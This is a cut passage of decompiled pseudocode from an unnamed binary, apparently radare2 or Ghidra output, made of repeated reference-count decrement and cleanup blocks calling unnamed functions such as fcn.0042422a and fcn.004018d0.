iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                (**(*piVar6 + 0xc))();\n                iVar5 = 0x76c7f0;\n                iVar7 = fcn.0042422a();\n                if (iVar7 != 0) {\n                    fcn.00402c50(iVar7);\n                    iVar5 = iVar7;\n                }\n                uStack4 = 0xffffffff;\n                piVar6 = in_stack_fffff430 + -4;\n                LOCK();\n                iVar7 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar7 == 1 || iVar7 + -1 < 0) {\n                    (**(**(in_stack_fffff430 + -0x10) + 4))(in_stack_fffff430 + -0x10, iVar5);\n                }\n                piVar6 = fcn.00423280();\n                if (piVar6 == NULL) goto code_r0x0040d272;\n                iStack1608 = (**(*piVar6 + 0xc))();\n                iStack1608 = iStack1608 + 0x10;\n                iStack1640 = 0x76c7f0;\n                uStack1636 = 0x4094f5;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1636 = 0x76c7f0;\n                    ppiStack1644 = 0x409508;\n                    iStack1640 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1644 = iStack1620 + -0x10;\n                piVar6 = iStack1620 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1648 = 0x40952e;\n                    (**(**ppiStack1644 + 4))();\n                }\n                ppiStack1644 = 0x40953a;\n                fcn.004018d0();\n                iStack1652 = 0x76c7f0;\n                uStack1648 = 0x40954f;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1648 = 0x76c7f0;\n                    ppiStack1656 = 0x409565;\n                    iStack1652 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1656 = iStack912 + -0x10;\n                piVar6 = iStack912 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1660 = 0x40958e;\n                    (**(**ppiStack1656 + 4))();\n                }\n                ppiStack1656 = 0x40959a;\n                fcn.004018d0();\n                iStack1664 = 0x76c7f0;\n                iStack1660 = 0x4095af;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1660 = 0x76c7f0;\n                    ppiStack1668 = 0x4095c5;\n                    iStack1664 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1668 = iStack1264 + -0x10;\n                piVar6 = iStack1264 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1672 = 0x4095ee;\n                    (**(**ppiStack1668 + 4))();\n                }\n                ppiStack1668 = 0x4095f7;\n                fcn.004018d0();\n                iStack1676 = 0x76c7f0;\n                uStack1672 = 0x40960c;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1672 = 0x76c7f0;\n                    ppiStack1680 = 0x40961f;\n                    iStack1676 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1680 = iStack1628 + -0x10;\n                piVar6 = iStack1628 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1684 = 0x409645;\n                    (**(**ppiStack1680 + 4))();\n                }\n                ppiStack1680 = 0x409651;\n                fcn.004018d0();\n                iStack1688 = 0x76c7f0;\n                uStack1684 = 0x409666;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1684 = 0x76c7f0;\n                    ppiStack1692 = 0x40967c;\n                    iStack1688 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1692 = iStack976 + -0x10;\n                piVar6 = iStack976 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1696 = 0x4096a5;\n                    (**(**ppiStack1692 + 4))();\n                }\n                ppiStack1692 = 0x4096ae;\n                fcn.004018d0();\n                iStack1700 = 0x76c7f0;\n                uStack1696 = 0x4096c3;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1696 = 0x76c7f0;\n                    ppiStack1704 = 0x4096d6;\n                    iStack1700 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1704 = ppiStack1644 + -0x10;\n                piVar6 = ppiStack1644 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1708 = 0x4096fc;\n                    (**(**ppiStack1704 + 4))();\n                }\n                ppiStack1704 = 0x409708;\n                fcn.004018d0();\n                iStack1712 = 0x76c7f0;\n                iStack1708 = 0x40971d;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1708 = 0x76c7f0;\n                    ppiStack1716 = 0x409733;\n                    iStack1712 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1716 = iStack1304 + -0x10;\n                piVar6 = iStack1304 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1720 = 0x40975c;\n                    (**(**ppiStack1716 + 4))();\n                }\n                ppiStack1716 = 0x409765;\n                fcn.004018d0();\n                iStack1724 = 0x76c7f0;\n                uStack1720 = 0x40977a;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1720 = 0x76c7f0;\n                    ppiStack1728 = 0x40978d;\n                    iStack1724 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1728 = iStack1660 + -0x10;\n                piVar6 = iStack1660 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1732 = 0x4097b3;\n                    (**(**ppiStack1728 + 4))();\n                }\n                ppiStack1728 = 0x4097bf;\n                fcn.004018d0();\n                iStack1736 = 0x76c7f0;\n                uStack1732 = 0x4097d4;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1732 = 0x76c7f0;\n                    ppiStack1740 = 0x4097ea;\n                    iStack1736 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1740 = iStack1152 + -0x10;\n                piVar6 = iStack1152 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1744 = 0x409813;\n                    (**(**ppiStack1740 + 4))();\n                }\n                ppiStack1740 = 0x40981c;\n                fcn.004018d0();\n                iStack1748 = 0x76c7f0;\n                iStack1744 = 0x409831;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1744 = 0x76c7f0;\n                    ppiStack1752 = 0x409844;\n                    iStack1748 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1752 = iStack1676 + -0x10;\n                piVar6 = iStack1676 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1756 = 0x40986a;\n                    (**(**ppiStack1752 + 4))();\n                }\n                ppiStack1752 = 0x409876;\n                fcn.004018d0();\n                iStack1760 = 0x76c7f0;\n                iStack1756 = 0x40988b;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1756 = 0x76c7f0;\n                    ppiStack1764 = 0x4098a1;\n                    iStack1760 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1764 = iStack1344 + -0x10;\n                piVar6 = iStack1344 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1768 = 0x4098ca;\n                    (**(**ppiStack1764 + 4))();\n                }\n                ppiStack1764 = 0x4098d3;\n                fcn.004018d0();\n                iStack1772 = 0x76c7f0;\n                iStack1768 = 0x4098e8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1768 = 0x76c7f0;\n                    ppiStack1776 = 0x4098fb;\n                    iStack1772 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1776 = ppiStack1692 + -0x10;\n                piVar6 = ppiStack1692 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1780 = 0x409921;\n                    (**(**ppiStack1776 + 4))();\n                }\n                ppiStack1776 = 0x40992d;\n                fcn.004018d0();\n                iStack1784 = 0x76c7f0;\n                uStack1780 = 0x409942;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1780 = 0x76c7f0;\n                    ppiStack1788 = 0x409958;\n                    iStack1784 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1788 = iStack1112 + -0x10;\n                piVar6 = iStack1112 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1792 = 0x409981;\n                    (**(**ppiStack1788 + 4))();\n                }\n                ppiStack1788 = 0x40998a;\n                fcn.004018d0();\n                iStack1796 = 0x76c7f0;\n                uStack1792 = 0x40999f;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1792 = 0x76c7f0;\n                    ppiStack1800 = 0x4099b2;\n                    iStack1796 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1800 = iStack1708 + -0x10;\n                piVar6 = iStack1708 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1804 = 0x4099d8;\n                    (**(**ppiStack1800 + 4))();\n                }\n                ppiStack1800 = 0x4099e4;\n                fcn.004018d0();\n                iStack1808 = 0x76c7f0;\n                iStack1804 = 0x4099f9;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1804 = 0x76c7f0;\n                    ppiStack1812 = 0x409a0f;\n                    iStack1808 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1812 = iStack1384 + -0x10;\n                piVar6 = iStack1384 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1816 = 0x409a38;\n                    (**(**ppiStack1812 + 4))();\n                }\n                ppiStack1812 = 0x409a41;\n                fcn.004018d0();\n                iStack1820 = 0x76c7f0;\n                uStack1816 = 0x409a56;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1816 = 0x76c7f0;\n                    ppiStack1824 = 0x409a69;\n                    iStack1820 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1824 = iStack1724 + -0x10;\n                piVar6 = iStack1724 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1828 = 0x409a8f;\n                    (**(**ppiStack1824 + 4))();\n                }\n                ppiStack1824 = 0x409a9b;\n                fcn.004018d0();\n                iStack1832 = 0x76c7f0;\n                uStack1828 = 0x409ab0;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1828 = 0x76c7f0;\n                    ppiStack1836 = 0x409ac6;\n                    iStack1832 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1836 = iStack1240 + -0x10;\n                piVar6 = iStack1240 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1840 = 0x409aef;\n                    (**(**ppiStack1836 + 4))();\n                }\n                ppiStack1836 = 0x409af8;\n                fcn.004018d0();\n                iStack1844 = 0x76c7f0;\n                uStack1840 = 0x409b0d;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1840 = 0x76c7f0;\n                    ppiStack1848 = 0x409b20;\n                    iStack1844 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1848 = ppiStack1740 + -0x10;\n                piVar6 = ppiStack1740 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1852 = 0x409b46;\n                    (**(**ppiStack1848 + 4))();\n                }\n                ppiStack1848 = 0x409b52;\n                fcn.004018d0();\n                iStack1856 = 0x76c7f0;\n                iStack1852 = 0x409b67;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1852 = 0x76c7f0;\n                    ppiStack1860 = 0x409b7d;\n                    iStack1856 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1860 = iStack1424 + -0x10;\n                piVar6 = iStack1424 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1864 = 0x409ba6;\n                    (**(**ppiStack1860 + 4))();\n                }\n                ppiStack1860 = 0x409baf;\n                fcn.004018d0();\n                iStack1868 = 0x76c7f0;\n                iStack1864 = 0x409bc4;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1864 = 0x76c7f0;\n                    ppiStack1872 = 0x409bd7;\n                    iStack1868 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1872 = iStack1756 + -0x10;\n                piVar6 = iStack1756 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1876 = 0x409bfd;\n                    (**(**ppiStack1872 + 4))();\n                }\n                ppiStack1872 = 0x409c09;\n                fcn.004018d0();\n                iStack1880 = 0x76c7f0;\n                uStack1876 = 0x409c1e;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1876 = 0x76c7f0;\n                    ppiStack1884 = 0x409c34;\n                    iStack1880 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1884 = iStack1144 + -0x10;\n                piVar6 = iStack1144 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1888 = 0x409c5d;\n                    (**(**ppiStack1884 + 4))();\n                }\n                ppiStack1884 = 0x409c66;\n                fcn.004018d0();\n                iStack1892 = 0x76c7f0;\n                uStack1888 = 0x409c7b;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1888 = 0x76c7f0;\n                    ppiStack1896 = 0x409c91;\n                    iStack1892 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1896 = iStack1772 + -0x10;\n                piVar6 = iStack1772 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1900 = 0x409cb7;\n                    (**(**ppiStack1896 + 4))();\n                }\n                ppiStack1896 = 0x409cc3;\n                fcn.004018d0();\n                iStack1904 = 0x76c7f0;\n                iStack1900 = 0x409cd8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1900 = 0x76c7f0;\n                    ppiStack1908 = 0x409cee;\n                    iStack1904 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1908 = iStack1464 + -0x10;\n                piVar6 = iStack1464 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1912 = 0x409d17;\n                    (**(**ppiStack1908 + 4))();\n                }\n                ppiStack1908 = 0x409d23;\n                fcn.004018d0();\n                iStack1916 = 0x76c7f0;\n                uStack1912 = 0x409d38;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1912 = 0x76c7f0;\n                    ppiStack1920 = 0x409d4e;\n                    iStack1916 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1920 = ppiStack1788 + -0x10;\n                piVar6 = ppiStack1788 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1924 = 0x409d77;\n                    (**(**ppiStack1920 + 4))();\n                }\n                ppiStack1920 = 0x409d83;\n                fcn.004018d0();\n                iStack1928 = 0x76c7f0;\n                uStack1924 = 0x409d98;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1924 = 0x76c7f0;\n                    ppiStack1932 = 0x409dae;\n                    iStack1928 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1932 = iStack1328 + -0x10;\n                piVar6 = iStack1328 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1936 = 0x409dd7;\n                    (**(**ppiStack1932 + 4))();\n                }\n                ppiStack1932 = 0x409de3;\n                fcn.004018d0();\n                iStack1940 = 0x76c7f0;\n                uStack1936 = 0x409df8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1936 = 0x76c7f0;\n                    ppiStack1944 = 0x409e0e;\n                    iStack1940 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1944 = iStack1804 + -0x10;\n                piVar6 = iStack1804 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1948 = 0x409e37;\n                    (**(**ppiStack1944 + 4))();\n                }\n                ppiStack1944 = 0x409e43;\n                fcn.004018d0();\n                iStack1952 = 0x76c7f0;\n                iStack1948 = 0x409e58;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1948 = 0x76c7f0;\n                    ppiStack1956 = 0x409e6e;\n                    iStack1952 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1956 = iStack1504 + -0x10;\n                piVar6 = iStack1504 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1960 = 0x409e97;\n                    (**(**ppiStack1956 + 4))();\n                }\n                ppiStack1956 = 0x409ea3;\n                fcn.004018d0();\n                iStack1964 = 0x76c7f0;\n                uStack1960 = 0x409eb8;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1960 = 0x76c7f0;\n                    ppiStack1968 = 0x409ece;\n                    iStack1964 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1968 = iStack1820 + -0x10;\n                piVar6 = iStack1820 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    uStack1972 = 0x409ef7;\n                    (**(**ppiStack1968 + 4))();\n                }\n                ppiStack1968 = 0x409f03;\n                fcn.004018d0();\n                iStack1976 = 0x76c7f0;\n                uStack1972 = 0x409f18;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    uStack1972 = 0x76c7f0;\n                    ppiStack1980 = 0x409f2e;\n                    iStack1976 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1980 = iStack1296 + -0x10;\n                piVar6 = iStack1296 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) {\n                    iStack1984 = 0x409f57;\n                    (**(**ppiStack1980 + 4))();\n                }\n                ppiStack1980 = 0x409f63;\n                fcn.004018d0();\n                iStack1988 = 0x76c7f0;\n                iStack1984 = 0x409f78;\n                iVar5 = fcn.0042422a();\n                if (iVar5 != 0) {\n                    iStack1984 = 0x76c7f0;\n                    ppiStack1992 = 0x409f8e;\n                    iStack1988 = iVar5;\n                    fcn.00402c50();\n                }\n                ppiStack1992 = ppiStack1836 + -0x10;\n                piVar6 = ppiStack1836 + -4;\n                LOCK();\n                iVar5 = *piVar6;\n                *piVar6 = *piVar6 + -1;\n                if (iVar5 == 1 || iVar5 + -1 < 0) 